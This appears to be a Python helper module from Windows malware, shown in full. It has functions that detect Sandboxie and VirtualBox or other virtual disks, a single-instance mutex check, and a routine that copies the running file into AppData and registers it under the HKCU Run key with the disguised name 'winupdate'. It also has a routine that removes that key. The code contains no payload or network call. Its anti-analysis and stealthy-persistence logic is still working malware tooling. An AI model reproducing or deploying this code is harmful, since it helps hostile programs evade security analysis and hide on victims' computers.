import ctypes, wmi, win32event, win32api, winerror, os, shutil, winreg


def detect_sandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
        return True
    except: return False


def detect_vm():
    for disk_drive in wmi.WMI().query("Select * from Win32_DiskDrive"):
        if "vbox" in disk_drive.Caption.lower() or "virtual" in disk_drive.Caption.lower():
            return True
    return False


def instance_running():
    mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        return True
    else:
        return False


def add_to_startup(appdata_path, current_file_path):
    try:
        path = appdata_path + "\\" + os.path.basename(current_file_path)

        shutil.copyfile(current_file_path, path)

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)

        return True
    except:
        return False


def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, REG_VALUE_NAME)
        winreg.CloseKey(key)

        return True
    except:
        return False


REG_VALUE_NAME = "winupdate"